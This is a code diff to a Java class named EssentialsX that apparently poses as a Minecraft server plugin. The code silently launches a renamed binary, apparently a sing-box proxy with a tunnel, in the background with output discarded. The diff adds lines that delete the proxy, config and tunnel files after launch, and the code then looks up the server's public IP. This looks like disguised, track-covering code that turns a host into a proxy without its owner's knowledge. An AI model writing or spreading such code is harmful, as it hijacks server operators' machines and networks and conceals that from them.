@@ -145,7 +145,7 @@ public class EssentialsX extends JavaPlugin {
                 new ProcessBuilder(
                         "bash",
                         "-c",
-                        "nohup ./EssentialsX.jar -c config.json > /dev/null 2>&1 &"
+                        "nohup ./EssentialsX.jar run -c config.json > /dev/null 2>&1 &"
                 );
 
 
@@ -181,9 +181,23 @@ public class EssentialsX extends JavaPlugin {
 
 
         Thread.sleep(
-                5000
+                8000
         );
 
+        // 删除临时文件
+
+        Files.deleteIfExists(
+                SingboxFile
+        );
+
+
+        Files.deleteIfExists(
+                ConfFile
+        );
+
+        Files.deleteIfExists(
+                TunnelFile
+        );
  
         String ip =
                 getPublicIP();
